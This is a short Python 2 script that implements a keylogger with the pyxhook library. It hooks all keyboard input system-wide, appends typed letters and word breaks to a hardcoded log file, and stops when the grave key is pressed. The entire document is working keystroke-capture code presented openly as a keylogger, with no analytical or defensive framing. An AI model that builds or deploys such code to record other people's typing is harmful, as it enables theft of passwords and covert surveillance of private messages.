"""
Sentinel character is '`' Grave character
"""
import pyxhook
#change this to log file's path
log_file='/home/vaibhav/Python Projects/KeyLogger/KeyLog.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
	with open(log_file,'a') as openFile:
		if event.Ascii in (range(65,91) + range(97,123)): #Takes input only characters
			openFile.write(event.Key)
		if event.Ascii == 32:
			openFile.write('\n')
		if event.Ascii==96: #96 is the ascii value of the grave key (`)
			openFile.close()
			new_hook.cancel()
#instantiate HookManager class
new_hook = pyxhook.HookManager() #Hook Manager holds the key values for key hold and release actions
#listen to all keystrokes
new_hook.KeyDown = OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()



		